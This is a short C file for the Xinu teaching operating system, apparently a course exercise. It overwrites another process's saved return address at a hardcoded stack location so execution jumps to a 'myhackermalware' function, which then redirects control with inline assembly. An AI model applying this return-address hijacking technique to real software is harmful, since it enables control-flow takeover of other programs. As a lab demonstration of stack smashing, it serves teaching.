/* myhacker.c - myhacker */
#include <xinu.h>
#include <stdio.h>
/*------------------------------------------------------------------------
 *  myhacker  -  is the hacker method that smashes stack of myvictim

 *------------------------------------------------------------------------
 */


void myhacker(int y)
{
	struct	procent *prptr;		/* Ptr to process' table entry	*/
				prptr = &proctab[y];
	kprintf("\n Process MYVICTIME 's Base is 0x%x, stack pointer is 0x%x \n ", prptr->prstkbase, prptr->prstkptr);
	prptr = &proctab[currpid];
	kprintf("Process MYHACKER 's Base is 0x%x, stack pointer is 0x%x ", prptr->prstkbase, prptr->prstkptr);
	unsigned int * address = 0xfdefbb4;
	kprintf("return address is -------- 0x%x", *address);
	*(address) = &myhackermalware+1 ;
}

void myhackermalware(int z)
{

	kprintf("\n WTFFFFFF is location to go back ");
	asm ("pushl %0;ret; ": /* No outputs. */:"r"( 0x10240d)	/* y is output operand */);
}
